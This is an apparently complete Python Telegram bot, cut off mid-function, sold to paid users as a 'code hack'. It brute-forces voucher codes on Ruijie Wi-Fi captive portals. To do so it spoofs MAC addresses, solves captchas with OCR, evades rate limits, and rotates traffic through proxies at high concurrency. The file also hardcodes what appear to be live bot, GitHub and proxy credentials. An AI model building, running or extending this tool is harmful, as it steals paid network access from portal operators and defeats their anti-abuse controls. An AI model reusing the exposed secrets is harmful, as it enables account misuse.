import os
import aiohttp
import asyncio
import json
import base64
import random
import re
import string
import time
import uuid
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiohttp import web
import cv2
import ddddocr
import numpy as np
from datetime import datetime, timedelta, timezone

# --- Configuration (GitHub / VPS လုံခြုံရေးအတွက် Environment Variables သုံးပါ) ---
BOT_TOKEN = os.getenv("BOT_TOKEN", "8980601502:AAFohlUv1IAQtk9iC6XJJy7EOB4UXTPBKIw")
GITHUB_TOKEN = os.getenv("GITHUB_TOKEN", "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")
REPO_OWNER = os.getenv("REPO_OWNER", "makkqt")
REPO_NAME = os.getenv("REPO_NAME", "Bot")
ADMIN_ID = os.getenv("ADMIN_ID", "8728200516")

# --- Proxy Configuration ---
PROXY_LIST = [
    "w9nx03l4kl8vdf0:iwx3ijrwgcyil91@rp.scrapegw.com:6060",
    "w9nx03l4kl8vdf0:iwx3ijrwgcyil91@rp.scrapegw.com:6060",
    "w9nx03l4kl8vdf0:iwx3ijrwgcyil91@rp.scrapegw.com:6060",
    "w9nx03l4kl8vdf0:iwx3ijrwgcyil91@rp.scrapegw.com:6060",
    "w9nx03l4kl8vdf0:iwx3ijrwgcyil91@rp.scrapegw.com:6060",
    "w9nx03l4kl8vdf0:iwx3ijrwgcyil91@rp.scrapegw.com:6060",
    "w9nx03l4kl8vdf0:iwx3ijrwgcyil91@rp.scrapegw.com:6060",
    "w9nx03l4kl8vdf0:iwx3ijrwgcyil91@rp.scrapegw.com:6060",
    "w9nx03l4kl8vdf0:iwx3ijrwgcyil91@rp.scrapegw.com:6060",
    "w9nx03l4kl8vdf0:iwx3ijrwgcyil91@rp.scrapegw.com:6060",
    "w9nx03l4kl8vdf0:iwx3ijrwgcyil91@rp.scrapegw.com:6060",
    "w9nx03l4kl8vdf0:iwx3ijrwgcyil91@rp.scrapegw.com:6060",
    "w9nx03l4kl8vdf0:iwx3ijrwgcyil91@rp.scrapegw.com:6060",
    "w9nx03l4kl8vdf0:iwx3ijrwgcyil91@rp.scrapegw.com:6060",
    "w9nx03l4kl8vdf0:iwx3ijrwgcyil91@rp.scrapegw.com:6060"
]

_proxy_index = 0
def get_next_proxy():
    global _proxy_index
    if not PROXY_LIST:
        return None
    proxy = PROXY_LIST[_proxy_index % len(PROXY_LIST)]
    _proxy_index += 1
    return f"http://{proxy}"

SUCCESS_CODE = asyncio.Queue()
bot = AsyncTeleBot(BOT_TOKEN)
user_data = {}
approve = {}
scan_tasks = {}
success_messages = {}
success_texts = {}
limited_messages = {}
limited_texts = {}
captcha_state = {}
session = None
_connector = None
CONCURRENCY = 1000
_voucher_sem = None
_start_time = time.monotonic()

MAX_CONCURRENT_SCANS = 20
active_scans_count = 0
active_scans_lock = asyncio.Lock()
paid_users = {}

async def handle(request):
    return web.Response(text="Bot is awake and running 24/7!")

async def web_server():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get('BOT_PORT', 8099))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()

async def get_file_content(path):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    async with session.get(url, headers=headers) as response:
        if response.status == 200:
            data = await response.json()
            content = base64.b64decode(data['content']).decode('utf-8')
            return json.loads(content), data['sha']
    return {}, None

async def update_file_content(path, content, sha, message):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {
        "Authorization": f"token {GITHUB_TOKEN}",
        "Content-Type": "application/json"
    }
    encoded = base64.b64encode(json.dumps(content).encode()).decode()
    payload = {
        "message": message,
        "content": encoded,
        "sha": sha
    }
    async with session.put(url, headers=headers, json=payload) as response:
        return await response.text()

def get_main_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("🎫 PAID USER", callback_data="menu_paid"),
        InlineKeyboardButton("🔗 STAR LINK Portal URL ထည့်ရန်", callback_data="menu_free_trial"),
        InlineKeyboardButton("📋 Success Codes ကြည့်မည်", callback_data="menu_result"),
        InlineKeyboardButton("🔄 Recheck ပြန်လုပ်စစ်မည်", callback_data="menu_recheck"),
        InlineKeyboardButton("🛑 Scan ရပ်မည်", callback_data="menu_stop"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back")
    )
    return keyboard

def get_voucher_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("🔢 VOUCHER 6 လုံး", callback_data="scan_6"),
        InlineKeyboardButton("🔢 VOUCHER 7 လုံး", callback_data="scan_7"),
        InlineKeyboardButton("🔢 VOUCHER 8 လုံး", callback_data="scan_8"),
        InlineKeyboardButton("🔤 VOUCHER ascii-lower", callback_data="scan_ascii-lower"),
        InlineKeyboardButton("🎲 VOUCHER all", callback_data="scan_all"),
        InlineKeyboardButton("🔤+🔢 MIXED 6လုံး (x3kark)", callback_data="scan_mixed"),
        InlineKeyboardButton("🔤+🔢 MIXED 8လုံး (8twcqeb)", callback_data="scan_mixed8"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back")
    )
    return keyboard

def get_digit_keyboard(mode):
    keyboard = InlineKeyboardMarkup(row_width=5)
    buttons = []
    for i in range(10):
        buttons.append(InlineKeyboardButton(str(i), callback_data=f"digit_{mode}_{i}"))
    keyboard.add(*buttons)
    keyboard.add(InlineKeyboardButton("🎲 Random ဖြစ်ရှာရန်", callback_data=f"digit_{mode}_random"))
    keyboard.add(InlineKeyboardButton("🔙 Back", callback_data="menu_back"))
    return keyboard

def get_start_scam_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        InlineKeyboardButton("🚀 START SCAM", callback_data="menu_start_scam"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back")
    )
    return keyboard

def get_paid_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        InlineKeyboardButton("✅ PAID USER ဖြစ်ရန် နှိပ်ပါ", callback_data="menu_enter_userid"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back")
    )
    return keyboard

def get_back_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(InlineKeyboardButton("🔙 Back", callback_data="menu_back"))
    return keyboard

def get_scam_button_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        InlineKeyboardButton("🛑 STOP SCAM", callback_data="menu_stop"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back")
    )
    return keyboard

@bot.message_handler(commands=['start'])
async def start(message):
    user_id = str(message.chat.id)
    user_name = message.from_user.first_name or message.from_user.username or "User"
    
    if message.chat.id not in user_data:
        user_data[message.chat.id] = {}
    
    if user_id in paid_users or user_id in approve:
        approve[message.chat.id] = True
        welcome_text = f"""✨ STAR LINK CODE HACK ✨\n\n👤 NAME: {user_name}\n🆔 USER ID: {user_id}\n\n🎉 မင်္ဂလာပါခင်ဗျာ!\n✅ သင့်အနေနဲ့ PAID USER ဖြစ်ပါတယ်။\n♾️ Unlimited Credit ဖြင့် သုံးစွဲနိုင်ပါသည်။\n\nအောက်ပါ Menu မှ သင်လိုချင်တာကိုရွေးချယ်ပါ။"""
    else:
        welcome_text = f"""✨ STAR LINK CODE HACK ✨\n\n👤 NAME: {user_name}\n🆔 USER ID: {user_id}\n\n⚠️ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\nPAID USER ဖြစ်ရန် အောက်ပါ Menu မှ PAID USER ကိုနှိပ်ပါ။\n👨‍💻 Admin: @kuranomi10"""
    
    await bot.send_message(message.chat.id, welcome_text, reply_markup=get_main_keyboard())

@bot.message_handler(commands=['sendall'])
async def send_all_broadcast(message):
    if str(message.chat.id) != ADMIN_ID:
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "Usage: /sendall [your_message]")
        return
    broadcast_text = f"📢 ADMIN NOTIFICATION\n\n{args[1]}"
    auth_list, _ = await get_file_content("auth_list.json")
    count = 0
    for uid in auth_list:
        try:
            await bot.send_message(int(uid), broadcast_text)
            count += 1
            await asyncio.sleep(0.1)
        except:
            continue
    await bot.reply_to(message, f"✅ User {count} ယောက်ထံသို့ စာပို့ပြီးပါပြီ။")

@bot.callback_query_handler(func=lambda call: True)
async def callback_handler(call):
    chat_id = call.message.chat.id
    user_id = str(chat_id)
    user_name = call.from_user.first_name or call.from_user.username or "User"
    
    if call.data == "menu_back":
        if user_id in paid_users or user_id in approve:
            text = f"""✨ STAR LINK CODE HACK ✨\n\n👤 NAME: {user_name}\n🆔 USER ID: {user_id}\n\n✅ PAID USER - Unlimited Access"""
        else:
            text = f"""✨ STAR LINK CODE HACK ✨\n\n👤 NAME: {user_name}\n🆔 USER ID: {user_id}\n\n⚠️ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\nPAID USER ဖြစ်ရန် အောက်ပါ Menu မှ PAID USER ကိုနှိပ်ပါ။"""
        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=text, reply_markup=get_main_keyboard())
        await bot.answer_callback_query(call.id)
        return
    
    if call.data == "menu_free_trial":
        if user_id not in paid_users and user_id not in approve:
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text="❌ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\nPAID USER ဖြစ်ရန် Admin @kuranomi10 သို့ ဆက်သွယ်ပါ။", reply_markup=get_back_keyboard())
            await bot.answer_callback_query(call.id)
            return
        text = f"""🔗 Portal URL ထည့်သွင်းရန်:\n\n/portal [your_portal_url]\n\nဥပမာ:\n/portal https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?lang=en_US&mac=02:00:00:00:00:00"""
        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=text, reply_markup=get_back_keyboard())
        await bot.answer_callback_query(call.id)
        return
    
    if call.data == "menu_start_scam":
        if user_id not in paid_users and user_id not in approve:
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text="❌ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\nPAID USER ဖြစ်ရန် Admin @kuranomi10 သို့ ဆက်သွယ်ပါ။", reply_markup=get_back_keyboard())
            await bot.answer_callback_query(call.id)
            return
        
        global active_scans_count, active_scans_lock
        async with active_scans_lock:
            if active_scans_count >= MAX_CONCURRENT_SCANS:
                await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=f"⚠️ Bot အလုပ်များနေပါသည်။ လက်ရှိ {active_scans_count}/{MAX_CONCURRENT_SCANS} ယောက် scan လုပ်နေပါသည်။", reply_markup=get_back_keyboard())
                await bot.answer_callback_query(call.id)
                return
            active_scans_count += 1
        
        if chat_id not in user_data or 'selected_mode' not in user_data.get(chat_id, {}):
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text="❌ VOUCHER အမျိုးအစားမရွေးရသေးပါ။", reply_markup=get_voucher_keyboard())
            await bot.answer_callback_query(call.id)
            return
        
        mode = user_data[chat_id]['selected_mode']
        start_digit = user_data[chat_id].get('start_digit')
        
        if 'session_url' not in user_data[chat_id]:
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text="🔗 Portal URL ကိုအရင်ထည့်သွင်းပါ:\n\n/portal [your_portal_url]", reply_markup=get_back_keyboard())
            await bot.answer_callback_query(call.id)
            return
        
        if chat_id in scan_tasks and not scan_tasks[chat_id]["task"].done():
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text="Scan သည် အလုပ်လုပ်နေပြီဖြစ်သည်။", reply_markup=get_scam_button_keyboard())
            await bot.answer_callback_query(call.id)
            return
        
        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=f"🔍 Scan စတင်နေပါသည်...\n\n🔢 VOUCHER Mode: {mode}", reply_markup=get_scam_button_keyboard(), parse_mode="Markdown")
        progress_msg = await bot.send_message(chat_id, "🔍 Scanning VOUCHER Codes...\n\n")
        scan_id = str(uuid.uuid4())
        
        try:
            portal_url = user_data[chat_id].get('session_url', 'Unknown')
            last_url = user_data[chat_id].get('last_admin_notified_url', '')
            if portal_url != last_url and portal_url != 'Unknown':
                admin_msg = f"🚀 **Scan Start Notification**\n\n👤 **User:** {user_name}\n🆔 **User ID:** `{user_id}`\n🔢 **Mode:** {mode}\n🔗 **Portal URL:**\n`{portal_url}`"
                await bot.send_message(ADMIN_ID, admin_msg, parse_mode="Markdown")
                user_data[chat_id]['last_admin_notified_url'] = portal_url
        except Exception as e:
            print(f"Admin Notification Error: {e}")

        task = asyncio.create_task(run_bruteforce(mode, chat_id, user_data[chat_id]['session_url'], scan_id, message=call.message, progress_msg=progress_msg, start_digit=start_digit))
        scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}
        await bot.answer_callback_query(call.id)
        return
    
    if call.data == "menu_paid":
        text = f"🔑 PAID USER ဖြစ်ရန်\n\nUSER ID: {user_id}\n\n✅ သင်၏ USER ID ကို Admin ထံ ပေးပို့ပြီး Key ဝယ်ယူပါ။\n👨‍💻 Admin: @kuranomi10"
        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=text, reply_markup=get_paid_keyboard())
        await bot.answer_callback_query(call.id)
        return
    
    if call.data == "menu_enter_userid":
        auth_list, _ = await get_file_content("auth_list.json")
        if user_id in auth_list:
            valid = check_key_expiration(auth_list[user_id])
            if valid:
                approve[chat_id] = True
                paid_users[user_id] = True
                if chat_id not in user_data:
                    user_data[chat_id] = {}
                await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=f"✅ PAID USER ဖြစ်ပါပြီ။\n\nUSER ID: {user_id}", reply_markup=get_main_keyboard())
            else:
                await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text="❌ သင်၏ Key Expired ဖြစ်နေပါသည်။", reply_markup=get_back_keyboard())
        else:
            await bot.send_message(chat_id=ADMIN_ID, text=f"🔔 New User Request:\nName: {user_name}\nID: {user_id}\n\nTo approve:\n/genkey unlimited {user_id}")
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=f"🙏 ကျေးဇူးပြု၍ Paid ဝယ်ယူပါ။\n\nUSER ID: {user_id}\n\nAdmin မှ အတည်ပြုပြီးပါက PAID USER ဖြစ်ပါမည်။", reply_markup=get_back_keyboard())
        await bot.answer_callback_query(call.id)
        return
    
    if call.data == "menu_result":
        if user_id not in paid_users and user_id not in approve:
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text="❌ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။", reply_markup=get_back_keyboard())
            await bot.answer_callback_query(call.id)
            return
        results, _ = await get_file_content("result.json")
        if user_id in results and results[user_id]:
            codes = "\n".join(results[user_id])
            text = f"✅ Found Codes:\n{codes}"
        else:
            text = "📋 သင့်တွင် Success Code မရှိသေးပါ။"
        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=text, reply_markup=get_back_keyboard())
        await bot.answer_callback_query(call.id)
        return
    
    if call.data == "menu_recheck":
        if user_id not in paid_users and user_id not in approve:
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text="❌ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။", reply_markup=get_back_keyboard())
            await bot.answer_callback_query(call.id)
            return
        if 'session_url' not in user_data.get(chat_id, {}):
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text="🔗 Portal URL ကိုအရင်ထည့်သွင်းပါ:\n\n/portal [your_portal_url]", reply_markup=get_back_keyboard())
            await bot.answer_callback_query(call.id)
            return
        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text="🔄 Recheck စတင်နေပါသည်...", reply_markup=get_scam_button_keyboard())
        await recheck_command(call.message)
        await bot.answer_callback_query(call.id)
        return
    
    if call.data == "menu_stop":
        await stop_scan_command(call.message)
        await bot.answer_callback_query(call.id, "🛑 Scan ကိုရပ်တန့်လိုက်ပါပြီ။", show_alert=True)
        return
    
    if call.data.startswith("scan_"):
        if user_id not in paid_users and user_id not in approve:
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text="❌ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။", reply_markup=get_back_keyboard())
            await bot.answer_callback_query(call.id)
            return
        mode = call.data.replace("scan_", "")
        if chat_id not in user_data:
            user_data[chat_id] = {}
        if 'session_url' not in user_data[chat_id]:
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text="🔗 Portal URL ကိုအရင်ထည့်သွင်းပါ:\n\n/portal [your_portal_url]", reply_markup=get_back_keyboard())
            await bot.answer_callback_query(call.id)
            return

        if mode in ["6", "7", "8"]:
            await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=f"🔢 VOUCHER {mode} လုံးအတွက် ထိပ်စီးနံပါတ်ရွေးပါ -", reply_markup=get_digit_keyboard(mode))
            await bot.answer_callback_query(call.id)
            return

        user_data[chat_id]['selected_mode'] = mode
        user_data[chat_id]['start_digit'] = None
        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=f"🔍 VOUCHER အမျိုးအစား: {mode}\n\n✅ START SCAM ကိုနှိပ်ပါ။", reply_markup=get_start_scam_keyboard())
        await bot.answer_callback_query(call.id)
        return

    if call.data.startswith("digit_"):
        parts = call.data.split("_")
        mode = parts[1]
        digit = parts[2]
        if chat_id not in user_data:
            user_data[chat_id] = {}
        user_data[chat_id]['selected_mode'] = mode
        user_data[chat_id]['start_digit'] = None if digit == "random" else digit
        
        text = f"🔍 VOUCHER Mode: {mode}\n"
        text += "🔢 Random ဖြစ်ရှာရန်" if digit == "random" else f"🔢 ထိပ်စီးနံပါတ်: {digit}"
        await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=text + "\n\n✅ START SCAM ကိုနှိပ်ပါ။", reply_markup=get_start_scam_keyboard())
        await bot.answer_callback_query(call.id)
        return

async def recheck_command(message):
    chat_id = message.chat.id
    if not approve.get(chat_id, False) and str(chat_id) not in paid_users:
        await bot.reply_to(message, "⚠️ Paid User မဟုတ်ပါ။")
        return
    results, sha = await get_file_content("result.json")
    chat_id_str = str(message.chat.id)
    if chat_id_str in results and results[chat_id_str]:
        if "session_url" not in user_data.get(message.chat.id, {}):
            await bot.reply_to(message, "Portal URL ထည့်သွင်းပေးပါ။")
            return
        codes = results[chat_id_str]
        await bot.reply_to(message, "Success Code များ ပြန်လည်စစ်ဆေးနေပါသည်။")
        session_url_recheck = user_data[message.chat.id]["session_url"]
        recheck_list = []
        for code in codes:
            recode = await perform_check(session_url_recheck, code, chat_id, scan_id=None, recheck=True, message=message)
            if recode:
                recheck_list.append(recode)
        to_show = "\n".join(recheck_list) if recheck_list else "Code များအားလုံးစစ်ဆေးပြီးပါပြီ။"
        await bot.reply_to(message, f"✅ Rechecked Codes:\n\n{to_show}")
        await save_rechecked_codes(chat_id_str, recheck_list, sha)
    else:
        await bot.reply_to(message, "Success code မရှိသေးပါ။")

async def save_rechecked_codes(chat_id_str, recheck_list, sha):
    results, _ = await get_file_content("result.json")
    results[chat_id_str] = recheck_list
    await update_file_content("result.json", results, sha, f"Update after recheck for {chat_id_str}")

@bot.message_handler(commands=['key'])
async def handle_key(message):
    global approve, paid_users
    args = message.text.split()
    if len(args) < 2:
        await bot.reply_to(message, "🔑 /key [your_key_here]")
        return
    key = args[1]
    user_id = str(message.chat.id)
    auth_list, _ = await get_file_content("auth_list.json")
    
    if key == user_id or user_id in auth_list or key in auth_list:
        valid = check_key_expiration(auth_list.get(user_id, auth_list.get(key, {})))
        if valid:
            approve[message.chat.id] = True
            paid_users[user_id] = True
            await bot.reply_to(message, f"✅ PAID USER ဖြစ်ပါပြီ။\n\nUSER ID: {user_id}")
        else:
            await bot.reply_to(message, "❌ Key Expired ဖြစ်နေပါသည်။")
    else:
        await bot.reply_to(message, f"❌ Key မမှန်ကန်ပါ။ USER ID: {user_id}")

@bot.message_handler(commands=['listkeys'])
async def listkeys(message):
    if str(message.chat.id) != ADMIN_ID:
        return
    auth_list, _ = await get_file_content("auth_list.json")
    if not auth_list:
        await bot.reply_to(message, "Registered key မရှိသေးပါ။")
        return
    lines = [f"👤 {uid}\n   Plan: {data.get('plan')}\n   Expires: {data.get('expires_at')}" for uid, data in auth_list.items()]
    await bot.reply_to(message, f"📋 Registered Keys ({len(auth_list)})\n\n" + "\n\n".join(lines))

@bot.message_handler(commands=['delkey'])
async def delkey(message):
    if str(message.chat.id) != ADMIN_ID:
        return
    args = message.text.split()
    if len(args) < 2:
        return
    user_id = args[1]
    auth_list, sha = await get_file_content("auth_list.json")
    if user_id in auth_list:
        del auth_list[user_id]
        await update_file_content("auth_list.json", auth_list, sha, f"Delete key for {user_id}")
        approve.pop(int(user_id), None)
        paid_users.pop(user_id, None)
        await bot.reply_to(message, f"✅ Key Deleted: {user_id}")

@bot.message_handler(commands=['genkey'])
async def genkey(message):
    if str(message.chat.id) != ADMIN_ID:
        return
    args = message.text.split()
    if len(args) < 3:
        await bot.reply_to(message, "Usage:\n/genkey unlimited 123456789")
        return
    plan = args[1]
    user_id = args[2]
    expiry = generate_expiry(plan)
    auth_list, sha = await get_file_content("auth_list.json")
    auth_list[user_id] = {"expires_at": expiry, "plan": plan}
    await update_file_content("auth_list.json", auth_list, sha, f"Add key for {user_id}")
    await bot.reply_to(message, f"✅ Key Generated\nUSER ID: {user_id}\nPLAN: {plan}")

@bot.message_handler(commands=['portal'])
async def handle_portal(message):
    user_id = str(message.chat.id)
    if user_id not in paid_users and user_id not in approve:
        await bot.reply_to(message, "❌ Paid User မဟုတ်ပါ။")
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "🔗 /portal [your_portal_url]")
        return
    url = args[1]
    if message.chat.id not in user_data:
        user_data[message.chat.id] = {}
    
    await bot.reply_to(message, "🔗 Portal URL စစ်ဆေးနေပါသည်...")
    if await check_session_url(session_url=url, use_proxy=True):
        user_data[message.chat.id]['session_url'] = url
        await bot.reply_to(message, "✅ Portal URL သိမ်းဆည်းပြီးပါပြီ။ VOUCHER ရွေးရန် Menu ကိုသုံးပါ။", reply_markup=get_voucher_keyboard())
    else:
        await bot.reply_to(message, "❌ Portal URL မှားယွင်းနေပါသည်။")

async def check_session_url(session_url, use_proxy=False):
    headers = {'user-agent': 'Mozilla/5.0'}
    proxy = get_next_proxy() if use_proxy else None
    try:
        async with session.get(session_url, allow_redirects=True, headers=headers, proxy=proxy) as response:
            return "sessionId" in str(response.url)
    except:
        return False

def check_key_expiration(expiration_time):
    try:
        if isinstance(expiration_time, dict):
            expiry = expiration_time.get("expires_at")
            if expiry == "9999-12-31T23:59:59Z":
                return True
            exp_time = datetime.fromisoformat(expiry.replace("Z", "+00:00"))
            return datetime.now(timezone.utc) < exp_time
        return False
    except:
        return False

def generate_expiry(plan):
    now = datetime.now(timezone.utc)
    plans = {
        "30m": timedelta(minutes=30),
        "1h": timedelta(hours=1),
        "1d": timedelta(days=1),
        "7d": timedelta(days=7),
        "1m": timedelta(days=30),
        "1y": timedelta(days=365),
        "unlimited": None
    }
    if plan == "unlimited":
        return "9999-12-31T23:59:59Z"
    return (now + plans.get(plan, timedelta(days=1))).isoformat()

async def github_update_scheduler():
    global SUCCESS_CODE
    while True:
        await asyncio.sleep(180)
        items = []
        while not SUCCESS_CODE.empty():
            items.append(await SUCCESS_CODE.get())
        if items:
            try:
                results, sha = await get_file_content("result.json")
                for item in items:
                    chat_id = str(item["chat_id"])
                    code = item["code"]
                    if chat_id not in results:
                        results[chat_id] = []
                    if code not in results[chat_id]:
                        results[chat_id].append(code)
                await update_file_content("result.json", results, sha, "Periodic Update")
            except Exception as e:
                print(f"Update Error: {e}")

def digit_generator(length):
    return "".join(random.choice(string.digits) for _ in range(length))

strings = string.ascii_lowercase + string.digits
def all_generator(length=6):
    return "".join(random.choice(strings) for _ in range(length))

strings_2 = string.ascii_lowercase
def ascii_generator(length=6):
    return "".join(random.choice(strings_2) for _ in range(length))

def mixed_generator(length=6):
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(length))

def iter_codes(mode, start_digit=None):
    if mode in ["6", "7", "8"]:
        length = int(mode)
        if start_digit is not None:
            start = int(start_digit) * (10 ** (length - 1))
            end = (int(start_digit) + 1) * (10 ** (length - 1))
            for i in range(start, end):
                yield str(i).zfill(length)
            return
        if mode in ["6", "7"]:
            codes = [str(i).zfill(length) for i in range(10 ** length)]
            random.shuffle(codes)
            yield from codes
            return
        if mode == "8":
            while True:
                yield digit_generator(8)
    if mode == "ascii-lower":
        while True:
            yield ascii_generator(6)
    if mode == "all":
        while True:
            yield all_generator(6)
    if mode == "mixed":
        while True:
            yield mixed_generator(6)
    if mode == "mixed8":
        while True:
            yield mixed_generator(8)
    raise ValueError(f"Unsupported mode: {mode}")

def format_progress(checked, total=None, speed=0, found=0):
    speed_str = f"{speed:,.0f} codes/min"
    if total is not None:
        bar_length = 20
        percent = (checked / total) * 100
        filled = min(bar_length, int(percent / 5))
        bar = "█" * filled + "░" * (bar_length - filled)
        return f"🔍Scanning...\n📦Checked : {checked:,}/{total:,}\n📊Progress : {percent:.2f}%\n⚡Speed : {speed_str}\n✅Found : {found}\n[{bar}]"
    return f"🔍Scanning...\n📦Checked : {checked:,}\n⚡Speed : {speed_str}\n✅Found : {found}"

BATCH_SIZE = 1000

async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, progress_msg=None, start_digit=None):
    try:
        code_iter = iter_codes(mode, start_digit=start_digit)
    except ValueError as e:
        await bot.send_message(chat_id, str(e))
        return
    
    total = 10 ** int(mode) if mode in ["6", "7", "8"] else None
    checked = 0
    scan_start = time.monotonic()
    global _voucher_sem
    if _voucher_sem is None:
        _voucher_sem = asyncio.Semaphore(CONCURRENCY)

    try:
        while True:
            current_task = scan_tasks.get(chat_id)
            if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
                return
            batch = [next(code_iter, None) for _ in range(BATCH_SIZE)]
            batch = [c for c in batch if c]
            if not batch:
                break

            async def _check(code):
                async with _voucher_sem:
                    return await perform_check(session_url, code, chat_id, scan_id, message=message)

            await asyncio.gather(*[_check(code) for code in batch], return_exceptions=True)
            checked += len(batch)

            found = len(success_texts.get(chat_id, []))
            elapsed = time.monotonic() - scan_start
            speed = (checked / elapsed * 60) if elapsed > 0 else 0
            text = format_progress(checked, total, speed, found)
            
            try:
                await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=text)
            except:
                pass
    finally:
        scan_tasks.pop(chat_id, None)
        global active_scans_count, active_scans_lock
        async with active_scans_lock:
            active_scans_count = max(0, active_scans_count - 1)

def get_mac():
    return ':'.join(f'{random.choice([0x02, 0x06, 0x0A, 0x0E]):02x}' if i == 0 else f'{random.randint(0x00, 0xff):02x}' for i in range(6))

async def get_session_id(session, session_url, previous_session_id=None):
    mac = get_mac()
    session_url = re.sub(r'(?<=mac=)[^&]+', mac, session_url)
    headers = {'user-agent': 'Mozilla/5.0'}
    try:
        async with session.get(session_url, headers=headers, allow_redirects=True) as req:
            session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url))
            return session_id.group(1) if session_id else previous_session_id
    except:
        return previous_session_id

async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None):
    post_url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
    response = None
    
    for _attempt in range(3):
        timeout = aiohttp.ClientTimeout(total=30)
        async with aiohttp.ClientSession(connector=_connector, connector_owner=False, timeout=timeout) as task_session:
            session_id = await get_session_id(task_session, session_url, None)
            if not session_id:
                return
            auth_code = None
            for _ in range(8):
                try:
                    image = await Captcha_Image(task_session, session_id)
                    text = await Captcha_Text(image)
                    if text and await Varify_Captcha(task_session, session_id, text):
                        auth_code = text
                        break
                except:
                    pass
            if not auth_code:
                return
            
            data = {"accessCode": code, "sessionId": session_id, "apiVersion": 1, "authCode": auth_code}
            headers = {"content-type": "application/json", "user-agent": "Mozilla/5.0"}
            
            try:
                async with task_session.post(post_url, json=data, headers=headers) as req:
                    response = await req.text()
            except:
                return
        if response and 'request limited' in response:
            continue
        break

    if response and 'logonUrl' in response:
        if recheck:
            return code
        if chat_id not in success_texts:
            success_texts[chat_id] = []
        expire_date, _ = await Code_Expires_Date(session_id)
        success_texts[chat_id].append(f"🎫 {code}\n   {expire_date}")
        await SUCCESS_CODE.put({"chat_id": chat_id, "code": code})
        if message:
            try:
                await bot.send_message(chat_id=message.chat.id, text=f"Success Code Found:\n🎫 {code}\n   {expire_date}")
            except:
                pass

async def Code_Expires_Date(active_id):
    paths = [f'https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{active_id}']
    headers = {'user-agent': 'Mozilla/5.0'}
    async with aiohttp.ClientSession(connector=_connector, connector_owner=False) as fresh_session:
        for url in paths:
            try:
                async with fresh_session.get(url, headers=headers) as req:
                    if req.status == 200:
                        respond = await req.json()
                        if respond.get('success'):
                            result = respond.get('result', {})
                            raw_minutes = result.get('totalMinutes', 'Unknown')
                            profile_name = result.get('profileName', 'Unknown')
                            return f"📋 Plan: {profile_name} | ⏳ Time: {raw_minutes}m", raw_minutes
            except:
                continue
    return "📋 Plan: Unknown | ⏳ Time: Unknown", 'Unknown'

_ocr = ddddocr.DdddOcr(show_ad=False)
def _ocr_sync(image_bytes):
    nparr = np.frombuffer(image_bytes, np.uint8)
    img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
    if img is None:
        return None
    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
